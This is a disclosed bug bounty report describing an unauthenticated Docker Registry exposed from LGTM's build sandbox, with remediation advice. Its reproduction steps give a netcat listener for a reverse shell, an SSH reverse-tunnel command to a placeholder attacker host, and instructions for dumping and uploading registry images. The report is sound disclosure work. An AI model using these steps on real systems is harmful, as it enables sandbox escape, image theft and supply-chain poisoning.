# Docker Registry HTTP API v2 exposed in HTTP without authentication leads to docker images dumping and poisoning

## Report Details
- **Report ID**: 347296
- **URL**: https://hackerone.com/reports/347296
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2018-05-04T00:33:58.671Z
- **Disclosed**: 2020-06-06T08:35:04.183Z

## Reporter
- **Username**: thehackerish
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: semmle

## Vulnerability Information
**Summary:**
Docker Registry HTTP API v2 is exposed in HTTP without authentication. An attacker can use it to dump your docker images and poison them.

**Description:**
While digging into the environment that hosts the sandboxed build container, I came across the port 5000 open on another machine (probably the host), which is used for Docker Registry (https://docs.docker.com/registry/). I was able to reach the service and dump the `lgtm/top` repository. I didn't try to upload anything because I didn't want to alter your docker images.

## Steps To Reproduce:

  1. Create a GitHub repository that has the attached file, name it .lgtm.yml and modify `ATTACKER_HOST` and `ATTACKER_PORT` to yours.
  2. set up a netcat listener: `nc -vlp ATTACKER_PORT`
  3. Add the project to lgtm, it should start building it. After some time, you should get a reverse shell.
  4. Make a remote SSH tunnel from the build container `ssh -R 5555:172.17.0.1:5000 attacker@ATTACKER_HOST -p SSH_PORT -f -N`
  5. Enter your attacker password and a SSH tunnel should be up.
  6. Using the docker_fetch tool (https://github.com/NotSoSecure/docker_fetch/), use the url http://127.0.0.1:5555 and dump the repository that you want.
  7. Additionally, you can follow this reference if you would like to test for blob uploads (https://docs.docker.com/registry/spec/api/#initiate-blob-upload) and look for this string `/v2/<name>/blobs/uploads/`. I tried to initiate an upload and it gave me the uuid of the upload, which means no restriction is made for uploads.

**NOTE**: Even if the shell is lost from the sandbox, the SSH Tunnel still works. This might mean a **sandbox escape**

## Supporting Material/References:

  *A writeup about the vulnerability in a pentest:  https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/
  *The Docker Registry Doc: https://docs.docker.com/registry/spec/api/#initiate-blob-upload

## Remediation:
1. Implement authentication to the service.
2. Use HTTPS
3. Limit the possibility of reverse shells by whitelisting only useful ports ( It might be challenging because of the purpose of the build sandbox)

## Impact

An attacker can use it to dump your docker images and poison them.

## Attachments
- 2
